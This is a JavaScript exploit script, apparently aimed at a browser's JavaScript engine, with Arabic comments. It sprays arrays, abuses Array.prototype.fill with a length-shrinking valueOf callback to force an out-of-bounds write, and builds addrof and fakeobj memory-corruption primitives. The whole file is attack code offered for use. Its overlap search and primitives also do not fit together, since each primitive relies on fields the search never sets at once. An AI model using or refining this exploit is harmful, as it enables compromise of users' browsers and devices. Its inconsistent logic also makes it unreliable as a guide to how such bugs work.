import { log, sleep } from './module/utils.mjs';

class MassOOBExploit {
    constructor() {
        this.marker = 0x42424242;
        this.found = false;
    }

    async execute() {
        await this.massOOBSpray();
        return await this.findRealOverlap();
    }

    async massOOBSpray() {
        log("Starting massive OOB spraying...");
        
        for (let round = 0; round < 100; round++) {
            log(`OOB round ${round}`);
            
            // كل جولة: spray ثم OOB-write
            await this.sprayArrays(round);
            await this.multipleOOBWrites(round);
            await sleep(20);
            
            if (this.found) break;
        }
    }

    async sprayArrays(round) {
        this.arrays = [];
        
        // spray مصفوفات floats و objects معاً
        for (let i = 0; i < 200; i++) {
            // مجموعة floats
            const floats = [1.1, 2.2, 3.3, 4.4, 5.5, 6.6, 7.7];
            floats.original_length = floats.length;
            floats.type = "float";
            floats.id = `f_${round}_${i}`;
            
            // مجموعة objects  
            const objects = [{a: 1}, {b: 2}, {c: 3}, {d: 4}, {e: 5}];
            objects.original_length = objects.length;
            objects.type = "obj";
            objects.id = `o_${round}_${i}`;
            
            this.arrays.push(floats, objects);
        }
        
        log(`Sprayed ${this.arrays.length} arrays`);
    }

    async multipleOOBWrites(round) {
        // OOB-writes متعددة بأحجام مختلفة
        const sizes = [50000, 100000, 200000, 500000];
        
        for (const size of sizes) {
            await this.singleOOBWrite(size, round);
            await sleep(5);
        }
    }

    async singleOOBWrite(size, round) {
        const v0 = [];
        
        // ملء المصفوفة بكائنات معقدة
        for (let i = 0; i < size; i++) {
            v0[i] = {
                round: round,
                index: i,
                float_data: [i * 0.1, i * 0.2, i * 0.3],
                obj_data: {x: i, y: i * 2},
                buffer: new ArrayBuffer(32 + (i % 16))
            };
        }
        
        const v10 = {
            oob_marker: this.marker,
            round: round,
            payload: new ArrayBuffer(64)
        };
        
        let shrunk = false;
        const o14 = {
            valueOf: () => {
                if (!shrunk) {
                    // تقليصات مختلفة في كل مرة
                    const shrink_to = [100, 500, 1000, 5000][round % 4];
                    v0.length = shrink_to;
                    shrunk = true;
                    log(`Shrunk to ${shrink_to}`);
                }
                return [0, 1, 2, 3, 4, 5][round % 6]; // startIndex مختلف
            }
        };
        
        try {
            v0.fill(v10, o14);
        } catch (e) {}
        
        // احتفظ بمرجع لمنع الـ GC
        this[`v0_${round}_${size}`] = v0;
    }

    async findRealOverlap() {
        log("Scanning for real memory overlap...");
        
        for (let i = 0; i < this.arrays.length; i++) {
            const arr = this.arrays[i];
            
            if (arr.type === "float") {
                // ابحث عن objects عبر OOB في float arrays
                for (let j = arr.original_length; j < arr.original_length + 100; j++) {
                    if (arr[j] !== undefined && typeof arr[j] === 'object') {
                        if (arr[j].a !== undefined || arr[j].b !== undefined) {
                            log(`FOUND! Float array has object at index ${j}`);
                            this.float_arr = arr;
                            this.obj_in_float = arr[j];
                            this.obj_index = j;
                            this.found = true;
                            return true;
                        }
                    }
                }
            }
            
            if (arr.type === "obj") {
                // ابحث عن floats عبر OOB في object arrays
                for (let j = arr.original_length; j < arr.original_length + 100; j++) {
                    if (typeof arr[j] === 'number' && arr[j] > 1.0 && arr[j] < 10.0) {
                        log(`FOUND! Object array has float at index ${j}: ${arr[j]}`);
                        this.obj_arr = arr;
                        this.float_in_obj = arr[j];
                        this.float_index = j;
                        this.found = true;
                        return true;
                    }
                }
            }
        }
        
        return false;
    }

    // الـ primitives الحقيقية
    addrof(obj) {
        if (!this.obj_arr || !this.float_index) return null;
        
        // ضع الكائن في object array
        this.obj_arr[0] = obj;
        
        // اقرأ من float array في الموضع المتداخل
        return this.float_arr[this.float_index];
    }

    fakeobj(addr) {
        if (!this.float_arr || !this.obj_index) return null;
        
        // اكتب العنوان في float array
        this.float_arr[this.obj_index] = addr;
        
        // اقرأ من object array في الموضع المتداخل
        return this.obj_arr[0];
    }
}

// التشغيل
async function main() {
    const exploit = new MassOOBExploit();
    const success = await exploit.execute();
    
    if (success) {
        log("SUCCESS: Real memory overlap found!");
        
        // اختبار الـ primitives
        const testObj = {secret: 0x1337, data: "test"};
        
        log("Testing addrof...");
        const addr = exploit.addrof(testObj);
        log(`Address: ${addr} (type: ${typeof addr})`);
        
        if (addr && typeof addr === 'number' && addr > 1000) {
            log("Testing fakeobj...");
            const fake = exploit.fakeobj(addr);
            log(`Fake object matches: ${fake === testObj}`);
        }
        
    } else {
        log("No overlap found -可能需要 جولات أكثر أو إعداد مختلف");
    }
}

main();